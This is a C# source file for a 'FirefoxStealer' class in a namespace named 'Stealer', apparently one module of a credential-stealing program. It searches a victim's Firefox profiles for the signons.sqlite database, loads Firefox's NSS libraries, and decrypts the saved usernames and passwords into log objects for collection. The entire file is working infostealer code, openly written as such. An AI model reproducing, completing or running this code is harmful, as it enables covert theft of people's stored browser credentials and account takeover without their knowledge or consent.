using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.Diagnostics;

namespace Stealer
{
	public class FirefoxStealer : IStealer
	{


		#region Firefox (Aktion)
		public class SHITEMID
		{
			public static long cb;
			public static byte[] abID;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct TSECItem
		{
			public int SECItemType;
			public int SECItemData;
			public int SECItemLen;
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string dllFilePath);

		private IntPtr NSS3;
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);


		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string configdir);

		public long NSS_Init(string configdir)
		{
			string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
			LoadLibrary(MozillaPath + "mozutils.dll");
			LoadLibrary(MozillaPath + "mozglue.dll");
			LoadLibrary(MozillaPath + "mozcrt19.dll");
			LoadLibrary(MozillaPath + "nspr4.dll");
			LoadLibrary(MozillaPath + "plc4.dll");
			LoadLibrary(MozillaPath + "plds4.dll");
			LoadLibrary(MozillaPath + "ssutil3.dll");
			LoadLibrary(MozillaPath + "mozsqlite3.dll");
			LoadLibrary(MozillaPath + "nssutil3.dll");
			LoadLibrary(MozillaPath + "softokn3.dll");
			NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
			IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
			DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate)); //NULLPOINTER
			return dll(configdir);
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate2();
		public long PK11_GetInternalKeySlot()
		{
			IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
			DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
			return dll();
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
		public long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
			DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
			return dll(slot, loadCerts, wincx);
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
		public int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
			DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
			return dll(arenaOpt, outItemOpt, inStr, inLen);
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
		public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
		{
			IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
			DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
			return dll(ref data, ref result, cx);
		}

		public static string signon;

		public class SQLiteBase5
		{
			[DllImport("kernel32")]
			private static extern IntPtr HeapAlloc(IntPtr heap, UInt32 flags, UInt32 bytes);

			[DllImport("kernel32")]
			private static extern IntPtr GetProcessHeap();

			[DllImport("kernel32")]
			private static extern int lstrlen(IntPtr str);
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_open(IntPtr fileName, ref IntPtr database);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_close(IntPtr database);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_exec(IntPtr database, IntPtr query, IntPtr callback, IntPtr arguments, ref IntPtr error);

			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_errmsg(IntPtr database);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_prepare_v2(IntPtr database, IntPtr query, int length, ref IntPtr statement, ref IntPtr tail);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_step(IntPtr statement);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_column_count(IntPtr statement);

			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_table_name(IntPtr statement, int columnNumber);

			[DllImport("mozsqlite3")]
			private static extern int sqlite3_finalize(IntPtr handle);

			//SQLite Konstanten
			private const int SQL_OK = 0;
			private const int SQL_ROW = 100;
			private const int SQL_DONE = 101;
			public enum SQLiteDataTypes
			{
				INT = 1,
				FLOAT,
				TEXT,
				BLOB,
				NULL
			}

			private IntPtr database;
			public SQLiteBase5()
			{
				database = IntPtr.Zero;
			}

			public SQLiteBase5(String baseName)
			{
				OpenDatabase(baseName);
			}

			public void OpenDatabase(String baseName)
			{
				if (sqlite3_open(StringToPointer(baseName), ref database) != SQL_OK)
				{
					database = IntPtr.Zero;
					throw new Exception("Error with opening database " + baseName + "!");
				}
			}

			public void CloseDatabase()
			{
				if (database != IntPtr.Zero)
				{
					sqlite3_close(database);
				}
			}

			public ArrayList GetTables()
			{
				String query = "SELECT name FROM sqlite_master " + "WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'" + "UNION ALL " + "SELECT name FROM sqlite_temp_master " + "WHERE type IN ('table','view') " + "ORDER BY 1";
				System.Data.DataTable table = ExecuteQuery(query);
				ArrayList list = new ArrayList();
				foreach (System.Data.DataRow row in table.Rows)
				{
					list.Add(row.ItemArray[0].ToString());
				}
				return list;
			}

			public void ExecuteNonQuery(String query)
			{
				IntPtr error = default(IntPtr);
				sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, ref error);
				if (error != IntPtr.Zero)
				{
					throw new Exception(("Error with executing non-query: \"" + query + "\"!") + PointerToString(sqlite3_errmsg(error)));
				}
			}

			public System.Data.DataTable ExecuteQuery(String query)
			{
				IntPtr statement = default(IntPtr);
				IntPtr excessData = default(IntPtr);
				sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), ref statement, ref excessData);
				System.Data.DataTable table = new System.Data.DataTable();
				int result = ReadFirstRow(statement, ref table);
				while (result == SQL_ROW)
				{
					result = ReadNextRow(statement, ref table);
				}
				sqlite3_finalize(statement);
				return table;
			}


			private int ReadFirstRow(IntPtr statement, ref System.Data.DataTable table)
			{
				table = new System.Data.DataTable("resultTable");
				int resultType = sqlite3_step(statement);
				if (resultType == SQL_ROW)
				{
					int columnCount = sqlite3_column_count(statement);
					string columnName = "";
					int columnType = 0;
					object[] columnValues = new object[columnCount];
					for (int i = 0; i < columnCount; i++)
					{
						columnName = PointerToString(sqlite3_column_name(statement, i));
						columnType = sqlite3_column_type(statement, i);
						if (columnType == Convert.ToInt32(SQLiteDataTypes.INT))
						{
							if (true)
							{
								table.Columns.Add(columnName, Type.GetType("System.Int32"));
								columnValues[i] = sqlite3_column_int(statement, i);
							}
						}

						else if (columnType == Convert.ToInt32(SQLiteDataTypes.FLOAT))
						{
							if (true)
							{
								table.Columns.Add(columnName, Type.GetType("System.Single"));
								columnValues[i] = sqlite3_column_double(statement, i);
							}
						}

						else if (columnType == Convert.ToInt32(SQLiteDataTypes.TEXT))
						{
							if (true)
							{
								table.Columns.Add(columnName, Type.GetType("System.String"));
								columnValues[i] = PointerToString(sqlite3_column_text(statement, i));
							}
						}
						else if (columnType == Convert.ToInt32(SQLiteDataTypes.BLOB))
						{
							if (true)
							{
								table.Columns.Add(columnName, Type.GetType("System.String"));
								columnValues[i] = PointerToString(sqlite3_column_blob(statement, i));
							}
						}

						else
						{
							if (true)
							{
								table.Columns.Add(columnName, Type.GetType("System.String"));
								columnValues[i] = "";
							}
						}
					}
					table.Rows.Add(columnValues);
				}
				return sqlite3_step(statement);
			}

			private int ReadNextRow(IntPtr statement, ref System.Data.DataTable table)
			{
				int columnCount = sqlite3_column_count(statement);

				int columnType = 0;
				object[] columnValues = new object[columnCount];

				for (int i = 0; i < columnCount; i++)
				{
					columnType = sqlite3_column_type(statement, i);

					if (columnType == Convert.ToInt32(SQLiteDataTypes.INT))
					{
						if (true)
						{
							columnValues[i] = sqlite3_column_int(statement, i);
						}
					}

					else if (columnType == Convert.ToInt32(SQLiteDataTypes.FLOAT))
					{
						if (true)
						{
							columnValues[i] = sqlite3_column_double(statement, i);
						}
					}

					else if (columnType == Convert.ToInt32(SQLiteDataTypes.TEXT))
					{
						if (true)
						{
							columnValues[i] = PointerToString(sqlite3_column_text(statement, i));
						}
					}
					else if (columnType == Convert.ToInt32(SQLiteDataTypes.BLOB))
					{
						if (true)
						{
							columnValues[i] = PointerToString(sqlite3_column_blob(statement, i));
						}
					}

					else
					{
						if (true)
						{
							columnValues[i] = "";
						}
					}
				}
				table.Rows.Add(columnValues);
				return sqlite3_step(statement);
			}

			private IntPtr StringToPointer(string str)
			{
				if (str == null)
				{
					return IntPtr.Zero;
				}
				else
				{
					Encoding encoding__1 = Encoding.UTF8;
					byte[] bytes = encoding__1.GetBytes(str);
					uint length = Convert.ToUInt32(bytes.Length + 1);
					IntPtr pointer = HeapAlloc(GetProcessHeap(), 0, Convert.ToUInt32(length));
					Marshal.Copy(bytes, 0, pointer, bytes.Length);
					Marshal.WriteByte(pointer, bytes.Length, 0);
					return pointer;
				}
			}

			private String PointerToString(IntPtr ptr)
			{
				if (ptr == IntPtr.Zero)
				{
					return null;
				}

				Encoding encoding__1 = Encoding.UTF8;

				int length = GetPointerLenght(ptr);
				Byte[] bytes = new Byte[length];
				Marshal.Copy(ptr, bytes, 0, length);
				return encoding__1.GetString(bytes, 0, length);
			}

			private int GetPointerLenght(IntPtr ptr)
			{
				if (ptr == IntPtr.Zero)
				{
					return 0;
				}
				return lstrlen(ptr);
			}
		}
		#endregion

		public bool Check()
		{
			bool found = false;
			string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
			string DefaultPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
			string[] Dirs = Directory.GetDirectories(DefaultPath);
			foreach (string dir in Dirs)
			{
				string[] Files = Directory.GetFiles(dir);
				foreach (string CurrFile in Files)
				{
					if (System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite"))
					{
						NSS_Init(dir);
						signon = CurrFile;
						found = true;
					}
				}
			}

			return found;
		}

		public List<ILog> Grab()
		{
			List<ILog> logs = new List<ILog>();

			if (Check())
			{
				try
				{
					long KeySlot = 0;

					string dataSource = signon;
					TSECItem tSecDec = new TSECItem();
					TSECItem tSecDec2 = new TSECItem();
					AccountLog accountLog = new AccountLog();
					byte[] bvRet = null;
					SQLiteBase5 db = new SQLiteBase5(dataSource);
					string ff = null;
					System.Data.DataTable table = db.ExecuteQuery("SELECT * FROM moz_logins;");
					System.Data.DataTable table2 = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
					foreach (System.Data.DataRow row in table2.Rows)
					{
					}
					KeySlot = PK11_GetInternalKeySlot();
					PK11_Authenticate(KeySlot, true, 0);

					foreach (System.Data.DataRow Zeile in table.Rows)
					{
						string formurl = System.Convert.ToString(Zeile["formSubmitURL"].ToString());
						if (!string.IsNullOrEmpty(formurl))
						{
							accountLog.SetService(formurl);
						}

						StringBuilder se = new StringBuilder(Zeile["encryptedUsername"].ToString());
						int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
						TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
						if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
						{
							if (tSecDec.SECItemLen != 0)
							{
								bvRet = new byte[tSecDec.SECItemLen];
								Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
								accountLog.SetLogin(System.Text.Encoding.ASCII.GetString(bvRet));
							}
						}

						StringBuilder se2 = new StringBuilder(Zeile["encryptedPassword"].ToString());
						int hi22 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length);
						TSECItem item2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi22), typeof(TSECItem));
						if (PK11SDR_Decrypt(ref item2, ref tSecDec2, 0) == 0)
						{
							if (tSecDec2.SECItemLen != 0)
							{
								bvRet = new byte[tSecDec2.SECItemLen];
								Marshal.Copy(new IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen);
								accountLog.SetPassword(System.Text.Encoding.ASCII.GetString(bvRet));
							}
						}
					}
					logs.Add(accountLog);
				}
				catch (Exception)
				{
				}
			}

			return logs;
		}
	}
}